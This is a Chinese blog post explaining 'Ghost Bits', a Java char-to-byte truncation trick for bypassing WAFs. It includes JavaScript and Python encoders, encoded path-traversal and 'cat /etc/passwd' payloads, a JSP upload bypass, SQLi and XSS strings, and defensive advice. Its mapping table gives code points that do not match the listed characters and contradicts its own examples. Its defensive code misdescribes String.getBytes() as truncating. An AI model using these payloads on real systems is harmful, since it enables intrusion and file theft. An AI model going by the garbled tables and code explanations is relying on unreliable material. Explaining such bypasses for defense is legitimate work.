---
title: "Ghost Bits：Black Hat Asia 2026 揭露的 Java Unicode 截断攻击"
date: 2026-05-15
tags: ["Ghost Bits", "Black Hat", "Java", "Unicode", "WAF Bypass", "安全研究"]
categories: ["安全研究"]

# 封面图
cover:
  image: ""
  alt: "Ghost Bits"

# 摘要
summary: "Ghost Bits 是 Black Hat Asia 2026 披露的一种新型攻击手法，利用 Java 中 char（16位）强转为 byte（8位）时高8位被静默丢弃的特性，让 WAF 看到无害的中文字符，而底层执行时变成危险 ASCII 字符，从而绑过 WAF 实现 SQL 注入、路径穿越、文件上传绕过等攻击。本文详解其原理、利用链条和防御方法。"

# 作者
authors:
  - laoxu

# 许可证
license: "MIT"

# 标签
tags: ["Ghost Bits", "Black Hat", "Java", "Unicode", "WAF Bypass"]

# 分类
categories: ["安全研究"]
---

## 概述

| 项目 | 内容 |
|------|------|
| **名称** | Ghost Bits（幽灵比特）|
| **首次披露** | Black Hat Asia 2026 |
| **漏洞类型** | Java 字符类型转换截断 |
| **影响** | WAF 绕过，实现注入攻击 |
| **相关 CVE** | 暂无独立 CVE（属于一类问题） |

---

## 核心原理

Java 的 `char` 是 16 位（2字节），`byte` 是 8 位（1字节）。

当把 `char` 强转为 `byte` 时，**高 8 位被静默丢弃**，只保留低 8 位：

```java
char c = '\u966A';  // Unicode 0x966A = 十进制 38506
byte b = (byte) c;   // 只取低 8 位 = 0x6A = 'j'
```

这意味着：**每个 ASCII 字符，都能找到一个 Unicode 字符的低字节恰好等于它**。

---

## 字符映射示例

| Unicode 字符 | 完整值 | 低 8 位 | ASCII | 危险用途 |
|-------------|--------|---------|-------|---------|
| 陪 (U+966A) | 0x966A | 0x6A | `j` | JSP 绕过 |
| 阮 (U+962E) | 0x962E | 0x2E | `.` | 路径穿越 |
| 严 (U+4E25) | 0x4E25 | 0x25 | `%` | URL 编码 |
| 疡 (U+760D) | 0x760D | 0x0D | `\r` | CRLF 注入 |
| 瘊 (U+760A) | 0x760A | 0x0A | `\n` | CRLF 注入 |

---

## 攻击链条

```
攻击者输入 Unicode 字符（如"陣陡陴阠阯陥陴陣阯陰陡陳陳陷除"）
           ↓
WAF / 业务校验看到：中文字符、乱码、奇怪字符 → 判定为无害
           ↓
校验通过
           ↓
底层 Java 代码执行 char → byte 截断
           ↓
低 8 位变成危险 ASCII 字符（如 "cat /etc/passwd"）
           ↓
触发：SQL 注入 / 文件上传 / 路径穿越 / SMTP 注入 / XSS
```

---

## 实际攻击示例

### 示例一：WAF 绕过路径穿越

**输入：**
```
阮阮阯阮阮阯陥陴陣阯陰陡陳陳陷除
```

| 视角 | 看到的内容 | 判断 |
|------|-----------|------|
| WAF | 中文字符，无法识别为路径 | 路径安全 ✅ |
| 后端 | `../../etc/passwd` | 危险 ⚠️ |

### 示例二：文件上传扩展名绕过

**上传文件名：** `1.陪sp`

| 视角 | 看到的文件名 | 判断 |
|------|------------|------|
| WAF | `1.陪sp`（扩展名含中文） | 扩展名安全 ✅ |
| 后端 | `1.jsp` | 危险 JSP 文件 ⚠️ |

### 示例三：命令注入

**输入编码：** `陣陡陴阠阯陥陴陣阯陰陡陳陳陷除`

| 视角 | 看到的内容 | 判断 |
|------|-----------|------|
| WAF | 中文字符，无法识别为命令 | 未检测到危险内容 ✅ |
| 后端 | `cat /etc/passwd` | 危险！⚠️ |

---

## 编码工具

### JavaScript 编码函数

```javascript
function ghostEncode(asciiText) {
    return [...asciiText].map(c => {
        const code = c.charCodeAt(0);
        return code <= 0x7F
            ? String.fromCharCode((0x96 << 8) | code)
            : c;
    }).join('');
}

// 示例
ghostEncode("cat /etc/passwd")
// → "陣陡陴阠阯陥陴陣阯陰陡陳陳陷除"
```

### Python 编码（等效）

```python
def ghost_encode(text):
    result = []
    for c in text:
        code = ord(c)
        if code <= 0x7F:
            result.append(chr((0x96 << 8) | code))
        else:
            result.append(c)
    return ''.join(result)

print(ghost_encode("cat /etc/passwd"))
# → 陣陡陴阠阯陥陴陣阯陰陡陳陳陷除
```

---

## 危险字符映射表

| 危险字符 | ASCII | 低字节 Unicode | 字符 |
|---------|-------|---------------|------|
| `.` | 0x2E | 0x962E | 阮 |
| `/` | 0x2F | 0x962F | 阯 |
| `\` | 0x5C | 0x965C | 陥 |
| `j` | 0x6A | 0x966A | 陪 |
| `n` | 0x6E | 0x966E | 陴 |
| `:` | 0x3A | 0x963A | 陣 |
| `%` | 0x25 | 0x4E25 | 严 |
| `_` | 0x5F | 0x965F | 陰 |
| `r` | 0x72 | 0x4E72 | 陡 |
| `m` | 0x6D | 0x4E6D | 陳 |

---

## 攻击面

| 攻击类型 | 触发条件 | 示例 |
|---------|---------|------|
| **路径穿越** | 文件读取路径由 char[] 构造 | `../../etc/passwd` |
| **文件上传绕过** | 文件名由 char[] 构造 | 上传 `shell.jsp` 绕过扩展名检查 |
| **SMTP 注入** | 邮件头由 char[] 构造 | CRLF 注入伪造发件人 |
| **SQL 注入** | SQL 语句由 char[] 构造 | `' OR 1=1--` |
| **XSS** | 输出由 char[] 构造 | `<script>alert(1)</script>` |

---

## 防御措施

### 1. 输入校验层

- **使用字节而非字符进行校验**：校验时用 `byte[]` 而非 `char[]`，确保看到的和执行的一致
- **明确指定字符编码**：使用 `StandardCharsets.UTF_8` 而非平台默认编码
- **正则白名单**：只允许已知安全字符，拒绝任意非 ASCII 范围字符

### 2. 代码层

```java
// 错误示例（截断发生）
String input = request.getParameter("name");
byte[] bytes = input.getBytes();  // char→byte 截断发生在这里
if (!isValidFileName(new String(bytes))) {  // 校验的是截断后的内容
    return;
}

// 正确示例
String input = request.getParameter("name");
byte[] bytes = input.getBytes(StandardCharsets.UTF_8);  // 明确编码
if (!isValidFileName(input)) {  // 用原始字符串校验
    return;
}
```

### 3. WAF 层

- WAF 检测规则应同时检查 **高字节 Unicode 字符**（如 `0x96` 系列）
- 对非 ASCII 范围的字符进行标记和告警
- 使用 Unicode 规范化（Normalization）将字符标准化后再检测

### 4. 安全配置

```java
// 强制 ISO-8859-1 编码读取输入
request.setCharacterEncoding("ISO-8859-1");

// 或使用字节级校验
byte[] data = request.getInputStream().readAllBytes();
String input = new String(data, StandardCharsets.ISO_8859_1);
```

---

## 思维延伸

Ghost Bits 攻击的本质是**字符编码不一致导致的信任边界跨越**：

- **WAF** 用 Unicode 视角看字符，看到的是"中文/乱码"
- **Java 底层** 用字节视角看字符，看到的是"ASCII 命令"
- **两者的差异** 就是攻击面

这类漏洞的可怕之处在于：**WAF 厂商很难修复**，因为这需要理解应用层的字节处理逻辑；而**开发者也不知道这是个坑**，因为 Java 的 char→byte 截断是静默发生的，不会抛异常。

---

## 参考

- Black Hat Asia 2026：《Cast Attack: A New Threat Posed by Ghost Bits in Java》
- GitHub 靶机：https://github.com/Xc1Ym/ghost-bits-lab
- Ghost Bits 工具：https://github.com/qi4L/GbitsGen